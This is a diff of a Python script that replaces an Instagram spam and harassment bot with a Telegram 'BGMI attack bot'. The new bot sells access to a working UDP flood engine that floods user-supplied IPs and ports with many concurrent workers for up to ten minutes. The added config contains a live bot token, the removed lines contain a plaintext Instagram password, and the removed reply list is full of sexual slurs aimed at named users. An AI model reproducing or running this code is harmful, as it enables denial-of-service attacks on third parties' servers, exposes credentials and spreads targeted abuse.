@@ -1,721 +1,896 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# ============================================================
+#  🔥 BGMI ULTIMATE ATTACK BOT v3 🔥
+#  Premium Effects | Referral | Button Menu | Force Sub | Status
+#  Pure Python UDP Engine (No Binary) - Termux + VPS
+# ============================================================
+
+import os
 import sys
+import json
+import time
+import socket
+import asyncio
+import datetime
+import logging
+import random
 import subprocess
 
-def install_package(package):
-    try:
-        __import__(package)
-    except ImportError:
-        print(f"[+] Installing {package}...")
-        subprocess.check_call([
-            sys.executable, "-m", "pip", "install", package
-        ])
-
-install_package("instagrapi")
-
-import time
-import random
-import threading
-import os
-import json
-import re
-from instagrapi import Client
-# ================= ACCOUNT SETTINGS =================
-USERNAME = "igqve"
-PASSWORD = "273209Ansh"
-OWNER    = "ig1vx"   # Main Owner Username
-
-cl = Client()
-SESSION_FILE = "session.json"
-ADMINS_FILE  = "admins.json"
-ECONOMY_FILE = "economy.json"
-
-# Persistent Login
-print("⚙️ Initializing Instagram Login...")
+# ---------- AUTO-INSTALL MODULES ----------
 try:
-    if os.path.exists(SESSION_FILE):
-        cl.load_settings(SESSION_FILE)
-        cl.login(USERNAME, PASSWORD)
-    else:
-        cl.login(USERNAME, PASSWORD)
-        cl.dump_settings(SESSION_FILE)
-except Exception as e:
-    print("⚠️ Login Error / 2FA Required:", e)
-    code = input("Enter 2FA Code: ")
-    cl.login(USERNAME, PASSWORD, verification_code=code)
-    cl.dump_settings(SESSION_FILE)
+    from aiogram import Bot, Dispatcher, F, BaseMiddleware
+    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+    from aiogram.filters import Command, CommandStart
+    from aiogram.fsm.context import FSMContext
+    from aiogram.fsm.state import State, StatesGroup
+    from aiogram.fsm.storage.memory import MemoryStorage
+    from aiogram.enums import ChatAction, ChatMemberStatus
+except ImportError:
+    print("[+] Installing aiogram...")
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "--upgrade", "aiogram"])
+    from aiogram import Bot, Dispatcher, F, BaseMiddleware
+    from aiogram.types import Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton
+    from aiogram.filters import Command, CommandStart
+    from aiogram.fsm.context import FSMContext
+    from aiogram.fsm.state import State, StatesGroup
+    from aiogram.fsm.storage.memory import MemoryStorage
+    from aiogram.enums import ChatAction, ChatMemberStatus
 
-BOT_ID = str(cl.user_id)
 try:
-    OWNER_ID = str(cl.user_id_from_username(OWNER))
-except Exception:
-    OWNER_ID = BOT_ID
+    import psutil
+    HAS_PSUTIL = True
+except ImportError:
+    HAS_PSUTIL = False
 
+logging.basicConfig(level=logging.INFO)
+log = logging.getLogger("BGMI-BOT")
+
+# ============================================================
+#  ⚙️ CONFIG - YAHAN SET KARO
+# ============================================================
+API_TOKEN = '8630786145:AAGfioLyM6LAdxcLB9f0eiqdyMi2Ysyl09I'
+ADMIN_IDS = [7766306643]                    # Admin Telegram IDs
+
+# 🔒 2 FORCE SUB CHANNELS (bot ko dono me admin banao)
+FORCE_CHANNELS = [
+    {"chat": "@YOUR_CHANNEL_1", "link": "https://t.me/a4lxe", "name": "Channel 1"},
+    {"chat": "@YOUR_CHANNEL_2", "link": "https://t.me/+wMfqbKHZ9b8xMGU9", "name": "Channel 2"},
+]
+# Private channel hai to "@username" ki jagah numeric chat id (ex: -1001234567890) daalo
+
+# 🎁 Referral settings
+POINTS_PER_REF    = 100   # points per referral
+POINTS_FOR_HOUR   = 500   # 500 points = 1 hour
+REDEEM_HOURS      = 1     # hours given on redeem
+BONUS_POINTS_NEW_USER = 50  # signup bonus
+
+# ⚔️ Attack limits
+COOLDOWN      = 200     # sec between attacks per user
+MAX_THREADS   = 300
+MAX_DURATION  = 600
+
+AUTH_FILE = "authorized_users.json"
+POINTS_FILE = "points.json"
+STATS_FILE = "stats.json"
+
+# ============================================================
+#  🎆 PREMIUM EMOJI IDs (message effects)
+# ============================================================
+PREMIUM_EMOJIS = [
+    "6100639476441161711","6102462664288509137","6100199534351097095",
+    "6102926404792360795","6100409966273764915","6100430105375415737",
+    "6102470558438400435","6100451820730064687","6102638599033858630",
+    "6100179369479642954","6100485115316542792","6102661242101440205",
+    "6102592514034770678","6102475626499808862","6102863908723236868",
+    "6102510630483271620","6282589525348720171","6055377380204092112",
+    "6055551219005398825","6055181976371994390","6055481009175010794",
+    "6055484548228062462","6055202102588742236","6055450347403484860",
+    "6055228576767155521","6055183995006623379","6337009415278828759",
+    "6336756235546663929","6334772471757020134","6336732269629153634",
+    "6336833407519038409","6337048276142924106","6337018975876030803",
+    "6336608132189395373","6336797785060286399","6336685231147326793",
+    "6336907611669011898","6336988189550451848","6337098578799893838",
+    "6336808092981796477","6337020083977592163","6337112997005107243",
+    "6337051755066433311","6336835907190004485","6336618976981818626",
+    "6336857218817728795","6336974471424908889","6337125748763008448",
+    "6337098338281725706","6336962978092425393","6336633214798404108",
+    "6337019139084786234","6337035356881296575","6337026908680625329",
+    "6336690569791676356","6337106906741480828","6337072645787361389",
+    "6336720729052027967","6336670885956557643","6337113894653271580",
+    "6334488003188105980","6336721798498884548","6336799284003873851",
+    "6337112129421713282","6336599202952388231","6336755629956275338",
+    "6334702021408465964","6337109865973948062","6336708763273142215",
+    "6337083451925078342","6336930400765484501","6334788126912815244",
+    "6337059606266651217","6336812005697002754","6336813629194640485",
+    "6337085796977221633","6336663202260065128","6334324468013341494",
+    "6337047855236129713","6336782885818742144","6336664645369076808",
+    "6336910583786383660","6336862179504954500","6336697226990985005",
+    "6336772620846899242","6337033209397649451","6336861449360514102",
+    "6336573617832206335","6337055242579876765","6336789422758960593",
+    "6336781331040577785","6336603218746810844","6337123072998383823",
+    "6336894825551371014","6334681658968513467","6336799919659031563",
+    "6336707603631972035","6336874467406389346","6336756411640323933",
+    "6336608037700115865","6336613247495445753","6336973539417007164",
+    "6336931040715612818","6336653869296132233","6336836572909938734",
+    "6336798231736885254","6336813951317187443","6336866435817545002",
+    "6336662845777780692","6336580455420141312","6336750437340816001",
+    "6336677470141422007","6337078718871117522","6336931345658289868",
+    "6336935322798005307","6336646834139700626","6337010179783007229",
+    "6336618208182673162","6336580975111184057","6336957184181543528",
+    "6336991256157101601","6336655355354815762","6336795865209904645",
+    "6337054177427988529","6336855354801921798","6336878444546105899",
+    "6336861037043654967","6336662472115626382","6337093386184432717",
+    "6336637947852365586","6336876696494417749","6334678278829252492",
+    "6337087411884923105","6336989731443711607","6336882614959349480",
+    "6336886055228153516","6336797591786757523","6336674519498890396",
+    "6336856849450540332","6337048379222138619","6336816932024491505",
+    "6336672814396874442","6336835035311644293","6336668004033504924",
+    "6336682357814205676","6336764563488252026","6337100812182887680",
+    "6336575056646249129"
+]
+
+# ============================================================
+#  GLOBALS
+# ============================================================
+bot = Bot(token=API_TOKEN)
+dp = Dispatcher(storage=MemoryStorage())
+BOT_USERNAME = ""
+
+AUTHORIZED_USERS = {}   # uid -> {"authorized_until": datetime}
+POINTS = {}             # uid -> points
+REFERRED_BY = {}        # uid -> referrer uid
+LAST_ATTACK_TIME = {}
+ATTACK = {"running": False, "stop_event": None, "workers": None,
+          "anim_msg": None, "info": None}
 START_TIME = time.time()
+STATS = {"total_attacks": 0, "packets": 0, "total_points": 0}
 
-# ================= ADMIN & PERSISTENCE DATA =================
-ADMINS = set([OWNER_ID])
-slide_targets = set()
+class AttackState(StatesGroup):    waiting_args = State()
+class BroadcastState(StatesGroup): waiting_text = State()
+class AddUserState(StatesGroup):   waiting_input = State()
+class RemoveUserState(StatesGroup):waiting_input = State()
+class UpdateUserState(StatesGroup):waiting_input = State()
 
-# State Management
-processed     = set()
-spam_flag     = {}
-gc_flag       = {}
-economy_data  = {}  # { user_id: { "bal": 1000, "last_daily": 0, "last_kill": 0, "protected_until": 0, "dead_until": 0 } }
+# ============================================================
+#  ✨ HELPERS
+# ============================================================
 
-def load_json_file(file_path, default):
-    if os.path.exists(file_path):
+def P(text: str) -> str:   # Premium style text (𝘼𝘽𝘾)
+    out = []
+    for ch in text:
+        o = ord(ch)
+        if 65 <= o <= 90:
+            out.append(chr(0x1D63C + o - 65))
+        elif 97 <= o <= 122:
+            out.append(chr(0x1D656 + o - 97))
+        elif 48 <= o <= 57:
+            out.append(chr(0x1D7EC + o - 48))
+        else:
+            out.append(ch)
+    return "".join(out)
+
+async def send_msg(chat_id, text, reply_markup=None, effect=True):
+    """Send with random premium emoji effect (auto-fallback if unsupported)."""
+    kwargs = {"chat_id": chat_id, "text": text, "reply_markup": reply_markup}
+    if effect and PREMIUM_EMOJIS:
         try:
-            with open(file_path, "r") as f:
-                return json.load(f)
-        except Exception as e:
-            print(f"[Error loading {file_path}]:", e)
-    return default
-
-def save_json_file(file_path, data):
-    try:
-        with open(file_path, "w") as f:
-            json.dump(data, f, indent=4)
-    except Exception as e:
-        print(f"[Error saving {file_path}]:", e)
-
-def load_admins():
-    global ADMINS
-    data = load_json_file(ADMINS_FILE, [])
-    ADMINS.update(data)
-
-def save_admins():
-    save_json_file(ADMINS_FILE, list(ADMINS))
-
-def load_economy():
-    global economy_data
-    economy_data = load_json_file(ECONOMY_FILE, {})
-
-def save_economy():
-    save_json_file(ECONOMY_FILE, economy_data)
-
-load_admins()
-load_economy()
-
-# ================= ECONOMY HELPER FUNCTIONS =================
-def get_user_acc(uid):
-    uid = str(uid)
-    if uid not in economy_data:
-        economy_data[uid] = {
-            "bal": 1000,  # Starting balance
-            "last_daily": 0,
-            "last_kill": 0,
-            "protected_until": 0,
-            "dead_until": 0
-        }
-        save_economy()
-    return economy_data[uid]
-
-def add_bal(uid, amount):
-    acc = get_user_acc(uid)
-    acc["bal"] = max(0, acc["bal"] + amount)
-    save_economy()
-
-# ================= INSTAGRAM FIRE EFFECT HELPER =================
-def send_fire(tid, text):
-    """Sends native Instagram Fire Effect message using raw API Payload"""
-    try:
-        cl.private_request(
-            f"direct_v2/threads/broadcast/text/",
-            data={
-                "thread_ids": f"[{tid}]",
-                "text": text,
-                "power_up_type": "1",  # 1 = FIRE EFFECT
-                "item_type": "power_up",
-                "client_context": cl.generate_client_context()
-            }
-        )
-    except Exception:
-        try:
-            cl.direct_send(text, thread_ids=[str(tid)])
-        except Exception as ex:
-            print("[Send Error]:", ex)
-
-# ================= AUTOMATIC SLIDE MESSAGES LIST (25+ TEXTS) =================
-SLIDE_RESPONSES = [
-     "NAME 𝙆𝙊 𝙋𝙀𝙇𝙏𝙀 𝙃𝙐𝙀 𝙀𝙉𝙏𝙍𝙔 ???? 🤣😎❤️‍🔥",
-    "NAME 𝐓𝐄𝐑𝐈 𝐌𝐀𝐀 𝐊𝐈 ̷C̷H̷U̷T̷ 𝙈𝙀 𝐋𝐎𝐔𝐃𝐀 ̷M̷A̷D̷A̷R̷C̷H̷O̷D̷ ???? 😂🩷🤚🏼",
-    "NAME 𝙍𝙀𝙋𝙇𝙔 𝐊𝐀𝐑 𝙂𝘼𝙍𝙄𝘽 𝐃𝐀𝐑 𝙆𝙔𝙐 𝐑𝐀𝐇𝐀 𝐇 ???? 😁🤙🏼🤍",
-    "NAME 𝐂𝐇𝐀𝐋 𝙏𝙀𝙍𝐈 𝐌𝐀 ̷C̷H̷O̷D̷U̷ 𝙋𝘼𝙏𝘼𝐊 𝐏𝐀𝐓𝐀𝐊 𝙆𝐄 ???? 🤪👻🩶",
-    "NAME ̷C̷H̷U̷D̷K̷E̷ 𝙎𝙋𝘼𝙈 𝐘𝐀𝐇𝐈 𝘼𝙐𝙆𝘼𝙏 𝐇 𝙏𝙀𝙍𝐈 𝐆𝐀𝐑𝐈𝘽 ???? 😹🩵🙌🏼",
-    "𝐂𝐏 𝐊𝐀𝐑 NAME 𝙂𝘼𝙍𝙄𝘽 𝐁𝐇𝐀𝐀𝐆 𝙈𝘼𝙏 𝐂𝐇𝐎𝐓𝐄𝐘 ???? 😂🩶🤚🏼",
-    "NAME 𝐊𝐈 𝙈𝙐𝙈𝙈𝙔 𝐊𝐎 ̷R̷A̷N̷D̷I̷ 𝘽𝘼𝙉𝘼 𝘿𝙐𝙉𝙂𝘼 𝙃𝙀𝙃𝙀𝙃𝙀 ???? 🤣💖✌🏼",
-    "NAME 𝐊𝐄 𝐁𝐀𝐀𝐏 𝙈𝘼𝙁𝙄𝘼 𝐘𝐄𝐇 𝐇𝐀𝐈 𝐈𝐍𝐊𝐈 𝐌𝐀𝐀 𝐊𝐄 𝐘𝐀𝐀𝐑 ???? 😆🩶🤚🏼",
-    "𝐊𝐀𝐁𝐀𝐃𝐈 𝙒𝘼𝙇𝙀 NAME 𝐊𝐈 𝙈𝙆𝘽 ???? 🤣👻💗",
-    "𝐀𝐑𝐄𝐘 NAME 𝐊𝐈 𝙈𝙆𝘽 𝙔𝘼𝘼𝐑 𝐁𝐇𝐀𝐆 𝙆𝘼𝙄𝙎𝙀 𝐑𝐇𝐄 𝐇𝐎 𝙂𝘼𝙍𝙄𝘽𝙊 ???? 😤👻💞",
-    "𝘼𝙍𝙀𝙔 NAME 𝙈𝘼𝘾𝘾𝙃𝙃𝘼𝙍 𝙏𝙈𝙆𝘾 ???? 😂🩷✌🏾",
-    "NAME 𝙏𝙐 𝙇𝘼𝘿𝙃𝙀𝙂𝘼 𝙃𝙐𝙈𝙎𝙀 𝙏𝙀𝙍𝙄 𝙈𝘼 𝘾𝙊𝘿𝙆𝙀 𝙈𝙄𝙏𝙏𝙄 𝙈𝙀 𝙈𝙄𝙇𝘼𝘿𝙀𝙉𝙂𝙀 𝙃𝙐𝙈 ???? 😂🔥🤸🏻",
-    "NAME 𝙇𝙀𝘼𝙑𝙀 𝙇𝙀 𝙏𝙐 𝙍𝙉𝘿𝙔𝙆𝙀 𝙋𝘼𝙎𝘼𝙉𝘿 𝙉𝘼𝙄 𝘼𝙔𝘼 𝙈𝙍𝙆𝙊 ???? 😏👋🏼",
-    "NAME 𝙂𝙍𝙄𝘽 𝙈𝘼 𝙆 𝘽𝘼𝘾𝙃𝙔 𝙂𝙃𝘼𝙍 𝙈𝙀 𝘼𝙏𝙏𝘼 𝙇𝙀 𝘼𝘼 ???? 😂🥲",
-    "NAME 𝘼𝙐𝙍𝘼𝙏𝙊 𝙆𝘼 𝙆𝘼𝙈 𝙍𝙊𝙏𝙄 𝘽𝙉𝘼𝙉𝘼 𝙃𝙊𝙏𝘼 𝙃 𝙏𝙊 NAME 𝙆𝙄 𝙈𝘼 𝙔𝘼𝙃𝘼 𝙆𝙔𝙐 𝘾𝙃𝙐𝘿𝙍𝙃𝙄 ???? 🤬🤣😭",
-    "NAME 𝙏𝙀𝙍𝙄 𝙈𝘼 𝙆𝙊 𝙎𝙀𝙉𝘼𝙋𝘼𝙏𝙄 𝙎𝙀 𝘾𝙃𝙐𝘿𝙒𝘼𝘿𝙀𝙉𝙂𝙀 ???? 🪖🖲️🔥",
-    "NAME 𝙏𝙍𝙔 𝙂𝙉𝘿 𝙈𝙀 𝘼𝙀𝙎𝘼 𝘽𝙃𝘼𝙇𝘼 𝙈𝘼𝙍𝙐𝙂𝘼 𝙎𝙄𝘿𝙃𝘼 𝙈𝙊𝙐𝙉𝙏 𝙀𝙑𝙀𝙍𝙀𝙎𝙏 𝙋𝙀 𝙍𝙐𝙆𝙀𝙂𝘼 ???? 💯🚀💔",
-    "NAME 𝑻𝑬𝑹𝑰 𝑴𝑨𝑨 ᵀᴬᴷᴸᴵ 𝑯𝑬𝑽𝑬𝑽𝑬 ???? 💖💛💚",
-    "NAME 𝙈𝙐𝙅𝙃𝙀 𝙉𝙐𝙈𝘽𝙀𝙍 𝙆𝙄 𝙆𝙔𝘼 𝙕𝘼𝙍𝙐𝙍𝘼𝙏\n𝙈𝘼𝙄 𝙃𝙐 𝙀𝙆 𝙋𝙇𝙐𝙈𝘽𝙀𝙍 👨‍🔧\n𝙅𝘼𝘽 𝘾𝙃𝙊𝘿𝙉𝙀 𝙆𝘼 𝙈𝘼𝙉𝙉 𝙆𝙍𝙀𝙂𝘼 NAME 𝙆𝙄 𝙈𝘼𝘼 𝘾𝙊𝘿 𝘿𝙐𝙉𝙂𝘼 𝙂𝙃𝘼𝙍 ???? 😂🔧",
-    "NAME 𝙏𝙀𝙍𝙔 𝙈𝘼𝘼 𝙆𝙊 𝙌𝘼𝘽𝘼𝙍 𝙉𝘼𝙎𝙀𝙀𝘽 𝙉𝘼 𝙃𝙊 𝙍𝙉𝘿𝙔𝙆𝙀 ???? 😑🖕🏽💔",
-    "NAME ꪶ 𝗟𝗨𝗡 𝗧𝗘 𝗩𝗔𝗝 ꪻ♡︎ ???? 😂👏🏻✨",
-    "NAME 𝙏𝙀𝙍𝙔 𝙉𝘼𝙉𝙄 𝘾𝙃𝙐𝘿 𝙂𝙔𝙄 𝘿𝙃𝘼𝙈 𝘿𝙃𝘼𝙈 𝘿𝙃𝘼𝙈 ???? 🥁🔊😍"
-     "⭅╡𝗧𝗠𝗞𝗖╞⭆",
-    "⭅╡𝗧𝗕𝗞𝗖╞⭆",
-    "⭅╡𝗖𝗛𝗨𝗗╞⭆",
-    "⭅╡𝗧𝗕𝗥╞⭆",
-    "⭅╡𝗞𝗜𝗗𝗘╞⭆",
-    "⭅╡𝗛𝗜𝗝𝗗𝗘╞⭆",
-    "⭅╡𝗖𝗛𝗔𝗞𝗞𝗘╞⭆",
-    "⭅╡𝗠𝗢𝗧𝗛𝗘𝗥𝗙𝗨𝗖𝗞𝗘𝗥╞⭆",
-    "⭅╡𝗕𝗜𝗧𝗖𝗛╞⭆",
-    "⭅╡𝗠𝗢𝗠𝗟𝗘𝗦𝗦╞⭆",
-    "⭅╡𝗛𝗢𝗠𝗘𝗟𝗘𝗦𝗦╞⭆",
-    "⭅╡𝗞𝗔𝗟𝗪𝗘╞⭆",
-    "⭅╡𝗪𝗛𝗢𝗥𝗘╞⭆",
-    "⭅╡𝗞𝗨𝗧𝗜𝗬𝗔╞⭆",
-    "⭅╡𝗦𝗔𝗦𝗨𝗞𝗘 𝗕𝗔𝗔𝗣 𝗛𝗔𝗜╞⭆"
-]
-
-AI_RESPONSES = [
-    "Haanji bolo! Main Alexa AI hu, kaise help karu? 🤖",
-    "Mujhe bulaaya aur main aa gaya! ✨",
-    "Main active hu, sab par nazar hai meri 👀",
-    "Group me aur bhi log hai unke sath gandmasti kro yaar 😭"
-]
-
-# WORKERS
-def spam_worker(tid, text):
-    while spam_flag.get(tid, False):
-        send_fire(tid, text)
-        time.sleep(2.5)
-
-def gc_worker(tid, name):
-    emojis = ["🔥", "✨", "🚀", "💎", "👑", "⚡"]
-    i = 0
-    while gc_flag.get(tid, False):
-        new_name = f"{name} {emojis[i % len(emojis)]}"
-        try:
-            cl.direct_thread_update_title(tid, new_name)
+            return await bot.send_message(**kwargs, message_effect_id=random.choice(PREMIUM_EMOJIS))
         except Exception:
             pass
-        i += 1
-        time.sleep(6.0)
+    return await bot.send_message(**kwargs)
 
-# ================= COMMAND HANDLERS =================
-def cmd_roll(tid): send_fire(tid, f"🎲 Dice Roll Result: {random.randint(1, 6)}")
-def cmd_flip_simple(tid): send_fire(tid, f"🪙 Coin Toss: {random.choice(['Heads 🪙', 'Tails 🪙'])}")
-
-def cmd_addadmin(tid, arg, sender):
-    if sender != OWNER_ID:
-        send_fire(tid, f"🚫 Permission Denied! Only Main Owner (@{OWNER}) can add admins.")
-        return
-    u = arg.strip().lstrip("@")
-    if not u: send_fire(tid, "❌ Use: .addadmin @username"); return
+async def edit_msg(msg, text):
     try:
-        uid = str(cl.user_id_from_username(u))
-        ADMINS.add(uid)
-        save_admins()
-        send_fire(tid, f"👑 Added @{u} as Bot Admin!")
-    except Exception as e: send_fire(tid, f"❌ Add Admin Failed: {e}")
+        await msg.edit_text(text)
+    except Exception:
+        pass
 
-def cmd_rmvadmin(tid, arg, sender):
-    if sender != OWNER_ID:
-        send_fire(tid, f"🚫 Permission Denied! Only Main Owner (@{OWNER}) can remove admins.")
-        return
-    u = arg.strip().lstrip("@")
-    if not u: send_fire(tid, "❌ Use: .rmvadmin @username"); return
+async def typing(chat_id, seconds=1.2):
+    end = time.time() + seconds
+    while time.time() < end:
+        try:
+            await bot.send_chat_action(chat_id, action=ChatAction.TYPING)
+        except Exception:
+            pass
+        await asyncio.sleep(1.2)
+
+def progress_bar(pct, width=16):
+    filled = int(pct / 100 * width)
+    return "█" * filled + "░" * (width - filled)
+
+def fmt_uptime(sec):
+    d, rem = divmod(int(sec), 86400)
+    h, rem = divmod(rem, 3600)
+    m, s = divmod(rem, 60)
+    if d: return f"{d}d {h}h {m}m"
+    if h: return f"{h}h {m}m {s}s"
+    return f"{m}m {s}s"
+
+def is_admin(uid):
+    return uid in ADMIN_IDS
+
+# ---------- FILE STORAGE ----------
+def load_all():
+    global AUTHORIZED_USERS, POINTS, REFERRED_BY, STATS
     try:
-        uid = str(cl.user_id_from_username(u))
-        if uid in ADMINS:
-            ADMINS.remove(uid)
-            save_admins()
-            send_fire(tid, f"🗑️ Removed @{u} from Admins!")
-        else: send_fire(tid, f"❌ @{u} is not an admin!")
-    except Exception as e: send_fire(tid, f"❌ Remove Admin Failed: {e}")
-
-def cmd_adminlist(tid):
-    msg = "👑 **BOT ADMINS LIST** 👑\n\n"
-    msg += f"👑 Owner: @{OWNER}\n"
-    for uid in ADMINS:
-        if uid != OWNER_ID:
-            msg += f"🔹 Admin ID: {uid}\n"
-    send_fire(tid, msg)
-
-def cmd_slide(tid, arg):
-    u = arg.strip().lstrip("@")
-    if not u: send_fire(tid, "❌ Use: .slide @username"); return
+        with open(AUTH_FILE) as f:
+            data = json.load(f)
+        for uid, udata in data.items():
+            if isinstance(udata, dict) and "authorized_until" in udata:
+                AUTHORIZED_USERS[int(uid)] = {
+                    "authorized_until": datetime.datetime.fromtimestamp(udata["authorized_until"])}
+    except Exception:
+        pass
     try:
-        uid = str(cl.user_id_from_username(u))
-        slide_targets.add(uid)
-        send_fire(tid, f"🔥 **SLIDE STARTED ON @{u}!** Ab ye jab bhi msg karega auto reply aayega.")
-    except Exception as e: send_fire(tid, f"❌ Target Error: {e}")
-
-def cmd_stopslide(tid, arg):
-    u = arg.strip().lstrip("@")
-    if not u: send_fire(tid, "❌ Use: .stopslide @username"); return
+        with open(POINTS_FILE) as f:
+            data = json.load(f)
+        POINTS = {int(k): v for k, v in data.get("points", {}).items()}
+        REFERRED_BY = {int(k): int(v) for k, v in data.get("referred_by", {}).items()}
+    except Exception:
+        pass
     try:
-        uid = str(cl.user_id_from_username(u))
-        slide_targets.discard(uid)
-        send_fire(tid, f"⏹️ **SLIDE STOPPED FOR @{u}!**")
-    except Exception as e: send_fire(tid, f"❌ Target Error: {e}")
+        with open(STATS_FILE) as f:
+            STATS = json.load(f)
+    except Exception:
+        STATS = {"total_attacks": 0, "packets": 0, "total_points": 0}
 
-def cmd_broadcast(tid, arg, sender):
-    if sender not in ADMINS:
-        send_fire(tid, "🚫 Permission Denied! Only Admins/Owner can broadcast.")
+def save_authorized_users():
+    with open(AUTH_FILE, "w") as f:
+        json.dump({str(uid): {"authorized_until": ud["authorized_until"].timestamp()}
+                   for uid, ud in AUTHORIZED_USERS.items()}, f, indent=2)
+
+def save_points():
+    with open(POINTS_FILE, "w") as f:
+        json.dump({"points": POINTS, "referred_by": REFERRED_BY}, f, indent=2)
+
+def save_stats():
+    with open(STATS_FILE, "w") as f:
+        json.dump(STATS, f, indent=2)
+
+def save_all():
+    save_authorized_users(); save_points(); save_stats()
+
+def ensure_registered(uid):
+    global STATS
+    if uid not in POINTS:
+        POINTS[uid] = BONUS_POINTS_NEW_USER
+        STATS["total_points"] += BONUS_POINTS_NEW_USER
+        save_points(); save_stats()
+
+async def check_authorization(user_id):
+    if user_id not in AUTHORIZED_USERS:
+        return False
+    ud = AUTHORIZED_USERS[user_id]
+    if ud["authorized_until"] < datetime.datetime.now():
+        del AUTHORIZED_USERS[user_id]
+        save_authorized_users()
+        return False
+    return True
+
+# ---------- FORCE SUB ----------
+async def is_force_sub_ok(user_id) -> bool:
+    if user_id in ADMIN_IDS:
+        return True
+    for ch in FORCE_CHANNELS:
+        try:
+            m = await bot.get_chat_member(ch["chat"], user_id)
+            if m.status in (ChatMemberStatus.LEFT, ChatMemberStatus.KICKED):
+                return False
+        except Exception:
+            return False
+    return True
+
+def join_kb():
+    rows = [[InlineKeyboardButton(text=f"📢 {ch['name']}", url=ch["link"])]
+            for ch in FORCE_CHANNELS]
+    rows.append([InlineKeyboardButton(text="✅ I've Joined", callback_data="check_sub")])
+    return InlineKeyboardMarkup(inline_keyboard=rows)
+
+class ForceSubMiddleware(BaseMiddleware):
+    async def __call__(self, handler, event, data):
+        if not isinstance(event, (Message, CallbackQuery)) or not getattr(event, "from_user", None):
+            return await handler(event, data)
+        if isinstance(event, CallbackQuery) and event.data == "check_sub":
+            return await handler(event, data)
+        if isinstance(event, Message) and event.text and event.text.startswith("/start"):
+            return await handler(event, data)
+        uid = event.from_user.id
+        if uid in ADMIN_IDS or await is_force_sub_ok(uid):
+            return await handler(event, data)
+        txt = "⚠️ " + P("You must join our channels to use the bot!")
+        if isinstance(event, Message):
+            await send_msg(event.chat.id, txt, reply_markup=join_kb())
+        else:
+            await event.answer()
+            await send_msg(event.message.chat.id, txt, reply_markup=join_kb())
         return
-    if not arg:
-        send_fire(tid, "❌ Use: .broadcast <your message>")
-        return
-    
-    send_fire(tid, "📢 Starting Broadcast to all group chats...")
-    count = 0
+
+# ============================================================
+#  ⚔️ ATTACK ENGINE (Pure Python UDP)
+# ============================================================
+async def flood_worker(idx, ip, port, stop_event, counts):
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    sock.setblocking(False)
+    addr = (ip, port)
+    payloads = [os.urandom(256) for _ in range(4)]
+    i = 0
     try:
-        threads = cl.direct_threads(amount=20)
-        for thread in threads:
-            send_fire(thread.id, f"📢 **GLOBAL BROADCAST** 📢\n\n{arg}\n\n~ By Admin")
-            count += 1
-            time.sleep(1.5)
-        send_fire(tid, f"✅ Broadcast sent successfully to {count} chats!")
-    except Exception as e:
-        send_fire(tid, f"❌ Broadcast Error: {e}")
+        while not stop_event.is_set():
+            try:
+                sock.sendto(payloads[i & 3], addr)
+                counts[idx] += 1
+            except BlockingIOError:
+                await asyncio.sleep(0.0005)
+            except OSError:
+                break
+            i += 1
+            if i % 64 == 0:
+                await asyncio.sleep(0)
+    finally:
+        sock.close()
 
-# ================= ECONOMY & SOCIAL COMMANDS =================
-def cmd_bal(tid, sender, reply_to_uid=None):
-    target_id = reply_to_uid if reply_to_uid else sender
-    acc = get_user_acc(target_id)
-    send_fire(tid, f"💰 **WALLET BALANCE**\nUser: `{target_id}`\nCash: **${acc['bal']}**")
+async def run_attack(chat_id, ip, port, duration, threads, anim):
+    stop_event = asyncio.Event()
+    ATTACK.update(stop_event=stop_event, running=True, info={"ip": ip, "port": port})
+    counts = [0] * threads
+    workers = [asyncio.create_task(flood_worker(i, ip, port, stop_event, counts))
+               for i in range(threads)]
+    ATTACK["workers"] = workers
+    ATTACK["anim_msg"] = anim
+    start = time.time()
+    try:
+        while not stop_event.is_set():
+            elapsed = time.time() - start
+            if elapsed >= duration:
+                break
+            pct = min(100, int(elapsed / duration * 100))
+            rem = max(0, int(duration - elapsed))
+            packets = sum(counts)
+            txt = (f"🚀 {P('Attack Running')}\n\n"
+                   f"🎯 {P('IP')}: {ip}\n🏖️ {P('Port')}: {port}\n"
+                   f"⏳ {P('Remaining')}: {rem}s | 📦 {packets:,} {P('packets')}\n\n"
+                   f"{progress_bar(pct)} {pct}%")
+            await edit_msg(anim, txt)
+            await asyncio.sleep(1)
+    finally:
+        stopped = stop_event.is_set()
+        stop_event.set()
+        await asyncio.gather(*workers, return_exceptions=True)
+        total = sum(counts)
+        STATS["packets"] += total
+        save_stats()
+        ATTACK.update(running=False, workers=None, stop_event=None,
+                      anim_msg=None, info=None)
+    return stopped, total
 
-def cmd_claim(tid, sender):
-    acc = get_user_acc(sender)
-    now = time.time()
-    if now - acc["last_daily"] < 86400: # 24 Hours
-        remaining = int((86400 - (now - acc["last_daily"])) / 3600)
-        send_fire(tid, f"⏳ You already claimed today! Try again in {remaining} hours.")
-        return
-    acc["last_daily"] = now
-    add_bal(sender, 500)
-    send_fire(tid, f"🎉 **DAILY REWARD CLAIMED!** Received **$500**. New Balance: **${acc['bal']}**")
-
-def cmd_kill(tid, sender, reply_to_uid):
-    if not reply_to_uid:
-        send_fire(tid, "❌ Reply to a user's message to kill them!")
-        return
-    if reply_to_uid == sender:
-        send_fire(tid, "❌ You cannot kill yourself!")
-        return
-
-    s_acc = get_user_acc(sender)
-    t_acc = get_user_acc(reply_to_uid)
-    now = time.time()
-
-    if now - s_acc["last_kill"] < 1200: # 20 min cooldown
-        rem = int((1200 - (now - s_acc["last_kill"])) / 60)
-        send_fire(tid, f"⏳ Kill attack on cooldown! Wait {rem} minutes.")
-        return
-
-    if t_acc["protected_until"] > now:
-        send_fire(tid, f"🛡️ Target is protected by Shield! Kill attack failed.")
-        return
-
-    s_acc["last_kill"] = now
-    t_acc["dead_until"] = now + 900 # Dead for 15 min
-    reward = random.randint(100, 500)
-    add_bal(sender, reward)
-
-    send_fire(tid, f"💥 **HEADSHOT!** User `{reply_to_uid}` was killed by `{sender}`! 🩸\nLoot earned: **${reward}**")
-
-def cmd_rob(tid, sender, reply_to_uid):
-    if not reply_to_uid:
-        send_fire(tid, "❌ Reply to a user's message to rob them!")
-        return
-    if reply_to_uid == sender:
-        send_fire(tid, "❌ You cannot rob yourself!")
-        return
-
-    s_acc = get_user_acc(sender)
-    t_acc = get_user_acc(reply_to_uid)
-    now = time.time()
-
-    if t_acc["protected_until"] > now:
